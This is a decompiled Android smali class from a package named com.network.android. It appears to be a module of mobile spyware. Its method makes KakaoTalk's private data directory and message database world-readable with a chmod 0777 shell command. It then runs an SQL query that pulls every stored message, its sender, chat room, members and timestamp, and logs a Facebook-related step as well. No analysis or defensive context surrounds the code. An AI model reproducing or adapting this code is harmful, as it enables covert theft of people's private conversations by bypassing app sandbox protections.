.class public final Lcom/network/android/d/c;
.super Lcom/network/android/p;


# static fields
.field protected static final c:Ljava/util/Map;

.field static final d:Ljava/lang/String;

.field static final e:Ljava/util/regex/Pattern;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    new-instance v0, Lcom/network/android/d/d;

    invoke-direct {v0}, Lcom/network/android/d/d;-><init>()V

    sput-object v0, Lcom/network/android/d/c;->c:Ljava/util/Map;

    const-string v1, "timestamp"

    invoke-interface {v0, v1}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    sput-object v0, Lcom/network/android/d/c;->d:Ljava/lang/String;

    const/4 v0, 0x0

    sput-object v0, Lcom/network/android/d/c;->e:Ljava/util/regex/Pattern;

    return-void
.end method

.method public static a(Landroid/os/Handler;Landroid/content/Context;Z)V
    .locals 12

    :try_start_0
    const-string v0, "getKakao GetContentIM start"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const-string v3, "kakao"

    const-string v4, "/data/data/com.kakao.talk/"

    const-string v5, "/data/data/com.kakao.talk/databases/KakaoTalk.db"

    const-string v6, "SELECT chat_logs.id, chat_logs.chat_id, chat_logs.created_at, chat_logs.message, chat_logs.user_id, chat_logs.type, c.members FROM chat_logs JOIN chat_rooms c ON chat_logs.chat_id=c.id "

    const-string v7, "chat_logs.created_at"

    const-string v8, "chmod 0777 /data/data/com.kakao.talk; chmod 0777 /data/data/com.kakao.talk/databases; chmod 0777 /data/data/com.kakao.talk/databases/KakaoTalk.db; chmod 0777 /data/data/com.kakao.talk/databases/KakaoTalk.db-journal; "

    sget-object v9, Lcom/network/android/d/c;->d:Ljava/lang/String;

    sget-object v10, Lcom/network/android/d/c;->c:Ljava/util/Map;

    const/16 v11, 0x82

    move-object v0, p0

    move-object v1, p1

    move v2, p2

    invoke-static/range {v0 .. v11}, Lcom/network/android/d/c;->a(Landroid/os/Handler;Landroid/content/Context;ZLjava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/util/Map;S)V

    const-string v0, "getKakao GetContentIM end"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "kakaogetFacebookApp GetContentIM exception- "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method
